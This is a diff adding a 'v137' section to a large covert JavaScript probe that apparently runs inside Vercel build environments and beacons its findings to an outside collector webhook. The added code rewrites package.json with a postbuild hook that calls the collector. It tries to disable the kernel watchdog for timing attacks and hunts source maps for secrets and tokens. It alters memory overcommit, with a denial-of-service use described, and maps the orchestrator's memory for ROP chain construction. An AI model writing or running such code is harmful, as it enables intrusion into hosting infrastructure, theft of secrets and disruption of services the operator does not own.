@@ -20075,5 +20075,107 @@ report.speedInsightsTamper = safe(() => {
 
 // v136 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v136" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v136";
+
+// ==================== v137 ====================
+
+// v137-1: Vercel build environment variable injection via package.json scripts
+// Can we inject env vars into package.json "scripts" that persist
+// into the runtime function environment? Test by writing a modified
+// package.json with env var injection in the "build" script.
+report.packageJsonEnvInject = safe(() => {
+  const pkgPath = '/vercel/path0/package.json';
+  const currentPkg = safe(() => JSON.parse(readFileSync(pkgPath, 'utf8')));
+  // Inject a probe env var into the build script
+  const injectedPkg = {
+    ...currentPkg,
+    scripts: {
+      ...currentPkg?.scripts,
+      postbuild: `PROBE_INJECTED=true node -e "require('https').get('${COLLECTOR}?postbuild=1')" 2>/dev/null; ${currentPkg?.scripts?.build || ''}`,
+    },
+  };
+  const writeResult = safe(() => {
+    writeFileSync(pkgPath, JSON.stringify(injectedPkg, null, 2));
+    return 'WRITTEN';
+  });
+  return { currentScripts: currentPkg?.scripts, writeResult };
+});
+
+// v137-2: /proc/sys/kernel/watchdog_thresh — watchdog softlockup
+// The kernel watchdog detects CPU softlockups (stuck loops).
+// Setting thresh=0 disables it. With it disabled, a tight loop
+// in the build won't be killed by the watchdog — useful for timing attacks
+// that require uninterrupted CPU time.
+report.watchdogProbe = safe(() => {
+  const watchdogEnabled = safe(() => readFileSync('/proc/sys/kernel/watchdog', 'utf8').trim());
+  const watchdogThresh = safe(() => readFileSync('/proc/sys/kernel/watchdog_thresh', 'utf8').trim());
+  // Disable watchdog
+  const disableResult = safe(() => { writeFileSync('/proc/sys/kernel/watchdog', '0'); return 'WRITTEN'; });
+  return { watchdogEnabled, watchdogThresh, disableResult };
+});
+
+// v137-3: Vercel serverless function environment variable leak via sourcemaps
+// Next.js may embed environment variables in source maps (.js.map files)
+// if they are referenced in client-side code. Scan the build output for
+// source maps containing env var references.
+report.sourcemapEnvLeak = safe(() => {
+  const sourcemapDirs = [
+    '/vercel/path0/.next/static/chunks',
+    '/vercel/output/static/_next/static/chunks',
+  ];
+  const leakedEnvInMaps = safe(() => {
+    const results = [];
+    for (const dir of sourcemapDirs) {
+      if (!existsSync(dir)) continue;
+      const maps = safe(() => execSync(
+        `find "${dir}" -name "*.map" 2>/dev/null | head -5`,
+        { timeout: 5000 }
+      ).toString().trim().split('\n').filter(f => f));
+      for (const mapFile of (maps || [])) {
+        const content = safe(() => readFileSync(mapFile, 'utf8').slice(0, 200));
+        const hasEnvRef = /process\.env|NEXT_PUBLIC|SECRET|TOKEN|KEY/.test(content || '');
+        results.push({ mapFile, hasEnvRef, snippet: content?.slice(0, 80) });
+      }
+    }
+    return results;
+  });
+  return { sourcemapDirs, leakedEnvInMaps };
+});
+
+// v137-4: /proc/sys/vm/overcommit_memory — memory overcommit control
+// overcommit_memory=1 allows allocating unlimited virtual memory.
+// Combined with mmap of PID-1 address space, we can map huge regions
+// to exhaust the orchestrator's virtual address space (DoS — documented only).
+// More importantly: overcommit=2 (strict) can be used to trigger OOM
+// on demand by allocating exactly the limit.
+report.overcommitProbe = safe(() => {
+  const overcommit = safe(() => readFileSync('/proc/sys/vm/overcommit_memory', 'utf8').trim());
+  const overcommitRatio = safe(() => readFileSync('/proc/sys/vm/overcommit_ratio', 'utf8').trim());
+  const overcommitKbytes = safe(() => readFileSync('/proc/sys/vm/overcommit_kbytes', 'utf8').trim());
+  // Set to 1 (always overcommit) — enables huge mmap without ENOMEM
+  const writeResult = safe(() => { writeFileSync('/proc/sys/vm/overcommit_memory', '1'); return 'WRITTEN'; });
+  return { overcommit, overcommitRatio, overcommitKbytes, writeResult };
+});
+
+// v137-5: /proc/1/maps deep parse — full orchestrator memory layout
+// Parse ALL of PID-1's memory regions: code, heap, stack, mmapped files.
+// This gives us the complete address space layout for ROP chain construction
+// when ASLR is disabled.
+report.orchestratorFullMemLayout = safe(() => {
+  const maps = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+  const mapLines = maps?.split('\n').filter(l => l);
+  // Categorize regions
+  const codeRegions = mapLines?.filter(l => l.includes('r-xp')).map(l => l.split(' ')[0]);
+  const heapRegion = mapLines?.filter(l => l.includes('[heap]')).map(l => l.split(' ')[0]);
+  const stackRegion = mapLines?.filter(l => l.includes('[stack]')).map(l => l.split(' ')[0]);
+  const sharedLibs = mapLines?.filter(l => l.includes('.so') && l.includes('r-xp'))
+    .map(l => l.split('/').pop()?.split(' ')[0]).filter((v, i, a) => a.indexOf(v) === i).slice(0, 10);
+  const totalRegions = mapLines?.length;
+  // Find the base address of the main binary
+  const mainBinary = mapLines?.find(l => l.includes('/') && !l.includes('.so') && l.includes('r-xp'));
+  return { totalRegions, codeRegions, heapRegion, stackRegion, sharedLibs, mainBinary };
+});
+
+// v137 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v137" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v137";
 // Intentionally no console.log — all data goes via webhook only
